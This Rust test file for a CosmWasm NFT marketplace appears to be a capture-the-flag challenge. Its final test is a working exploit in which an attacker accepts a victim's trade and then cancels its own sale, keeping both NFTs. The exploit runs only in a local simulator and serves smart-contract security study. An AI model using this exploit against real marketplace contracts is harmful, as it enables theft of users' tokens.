#[cfg(test)]
pub mod tests {
    use crate::{
        contract::DENOM,
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::{Sale, Trade},
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw721::{Cw721QueryMsg, NumTokensResponse, OwnerOfResponse};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        )
        .with_reply(crate::contract::reply);
        Box::new(contract)
    }

    fn token_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            cw721_base::entry::execute,
            cw721_base::entry::instantiate,
            cw721_base::entry::query,
        );
        Box::new(contract)
    }

    pub const ADMIN: &str = "admin";
    pub const USER1: &str = "user1";
    pub const NFT1: &str = "awesome NFT 1";
    pub const USER2: &str = "user2";
    pub const NFT2: &str = "awesome NFT 2";
    pub const USER3: &str = "user3";
    pub const NFT3: &str = "awesome NFT 3";

    pub fn proper_instantiate() -> (App, Addr, Addr) {
        let mut app = App::default();
        let challenge_id = app.store_code(challenge_contract());
        let cw_721_id = app.store_code(token_contract());

        // Init token
        let token_inst = cw721_base::msg::InstantiateMsg {
            name: "OakSec NFT".to_string(),
            symbol: "OSNFT".to_string(),
            minter: ADMIN.to_string(),
        };

        let token_addr = app
            .instantiate_contract(
                cw_721_id,
                Addr::unchecked(ADMIN),
                &token_inst,
                &[],
                "nft token",
                None,
            )
            .unwrap();

        // Init challenge
        let challenge_inst = InstantiateMsg {
            nft_address: token_addr.to_string(),
        };

        let contract_addr = app
            .instantiate_contract(
                challenge_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Minting one to each User1, User2, User 3
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT1.to_string(),
                owner: USER1.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT2.to_string(),
                owner: USER2.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();

        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT3.to_string(),
                owner: USER3.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();

        let n_tokens: NumTokensResponse = app
            .wrap()
            .query_wasm_smart(token_addr.clone(), &Cw721QueryMsg::NumTokens {})
            .unwrap();
        assert_eq!(n_tokens.count, 3);

        (app, contract_addr, token_addr)
    }

    pub fn base_scenario() -> (App, Addr, Addr) {
        let mut app = App::default();
        let challenge_id = app.store_code(challenge_contract());
        let cw_721_id = app.store_code(token_contract());

        // Init token
        let token_inst = cw721_base::msg::InstantiateMsg {
            name: "OakSec NFT".to_string(),
            symbol: "OSNFT".to_string(),
            minter: ADMIN.to_string(),
        };

        let token_addr = app
            .instantiate_contract(
                cw_721_id,
                Addr::unchecked(ADMIN),
                &token_inst,
                &[],
                "nft token",
                None,
            )
            .unwrap();

        // Init challenge
        let challenge_inst = InstantiateMsg {
            nft_address: token_addr.to_string(),
        };

        let contract_addr = app
            .instantiate_contract(
                challenge_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // Minting one to User1
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT1.to_string(),
                owner: USER1.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();
        // Minting one to User2
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT2.to_string(),
                owner: USER2.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();

        // Seller approves to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create a new tradable sale
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT1.to_string(),
                price: Uint128::from(100u128),
                tradable: true,
            },
            &[],
        )
        .unwrap();

        // Seller approves to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT2.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create a new non-tradable sale
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT2.to_string(),
                price: Uint128::from(150u128),
                tradable: false,
            },
            &[],
        )
        .unwrap();

        (app, contract_addr, token_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn sell_flow() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create a new sale
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT1.to_string(),
                price: Uint128::from(100u128),
                tradable: false,
            },
            &[],
        )
        .unwrap();

        let sale_info: Sale = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::GetSale {
                    id: NFT1.to_string(),
                },
            )
            .unwrap();
        assert_eq!(sale_info.owner, Addr::unchecked(USER1));

        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, Addr::unchecked(contract_addr.clone()));

        // Buy the NFT
        app = mint_tokens(app, USER2.to_owned(), sale_info.price);
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr,
            &ExecuteMsg::BuyNFT {
                id: NFT1.to_string(),
            },
            &[coin(sale_info.price.u128(), DENOM)],
        )
        .unwrap();

        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr,
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER2.to_string());
    }

    #[test]
    fn trade_flow() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create a new sale
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT1.to_string(),
                price: Uint128::from(100u128),
                tradable: true,
            },
            &[],
        )
        .unwrap();

        let sale_info: Sale = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::GetSale {
                    id: NFT1.to_string(),
                },
            )
            .unwrap();
        assert_eq!(sale_info.owner, USER1.to_string());

        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT2.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Create trade offer
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT1.to_string(),
                offered: NFT2.to_string(),
            },
            &[],
        )
        .unwrap();

        let owner_of: Trade = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::GetTrade {
                    id: NFT1.to_string(),
                    trader: USER2.to_string(),
                },
            )
            .unwrap();
        assert_eq!(owner_of.trader, USER2.to_string());

        // Accept trade
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr,
            &ExecuteMsg::AcceptTrade {
                id: NFT1.to_string(),
                trader: USER2.to_string(),
            },
            &[],
        )
        .unwrap();

        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER2.to_string());

        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr,
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT2.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER1.to_string());
    }

    const VICTIM: &str = "victim";
    const NFT_VICTIM: &str = "victim's awesome nft";
    const NFT_TRADEABLE: &str = "tradeable nft";

    // USER1 can be the hacker here for trade-able sale
    #[test]
    fn exploit_sales_invariant_violation() {
        // USER1 has NFT1 as a tradeable sale
        // USER2 has NFT2 as a non-tradeable sale
        let (mut app, contract_addr, token_addr) = base_scenario();
        // Minting another trade-able NFT to USER2 for demonstration
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT_TRADEABLE.to_string(),
                owner: USER2.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        ).unwrap(); 
        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_TRADEABLE.to_string(),
                expires: None,
            },
            &[],
        ).unwrap();
        // Create a new *tradeable* sale
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::NewSale {
                id: NFT_TRADEABLE.to_string(),
                price: Uint128::from(100u128),
                tradable: true,
            },
            &[],
        ).unwrap(); 

        // Minting NFT_VICTIM to Victim
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT_VICTIM.to_string(),
                owner: VICTIM.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();
        // Approve to transfer the NFT
        app.execute_contract(
            Addr::unchecked(VICTIM),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_VICTIM.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();
        // victim offers to trade NFT_VICTIM to USER1 for NFT1
        app.execute_contract(
            Addr::unchecked(VICTIM),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT1.to_string(),
                offered: NFT_VICTIM.to_string(),
            },
            &[],
        )
        .unwrap();

        // EXPLOIT: USER1 can accept the trade and get NFT_VICTIM,
        // then uses the same NFT to get their original NFT back
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::AcceptTrade {
                id: NFT1.to_string(),
                trader: VICTIM.to_string(),
            },
            &[],
        )
        .unwrap();
        // USER1 approves their newly owned NFT_VICTIM
        app.execute_contract(
            Addr::unchecked(USER1),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_VICTIM.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();
   
        // Victim participates in marketplace and wants to trade
        // NFT_1 for a new trade-able NFT. They approve transfer permissions
        app.execute_contract(
            Addr::unchecked(VICTIM),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT1.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();
        // We can use any *trade-able* NFT on sale
        app.execute_contract(
            Addr::unchecked(VICTIM),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT_TRADEABLE.to_string(),
                offered: NFT1.to_string(),
            },
            &[],
        ).unwrap(); 

        // EXPLOIT: 
        // USER1 Cancel Sale and gets their NFT back
        // 
        // Alternative exploit: USER1 offers NFT_VICTIM for NFT1 on sale
        // and USER1 can successfully accept their own SALE. Both 
        // attacks depend on bad SALES invariant
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::CancelSale {
                id: NFT1.to_string(),
            },
            &[],
        )
        .unwrap();

        // USER1 owns both NFT1 and NFT_VICTIM for free
        // Gets back NFT1
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER1.to_string());
        // And owns NFT_VICTIM
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr,
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT_VICTIM.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER1.to_string());
    }
}
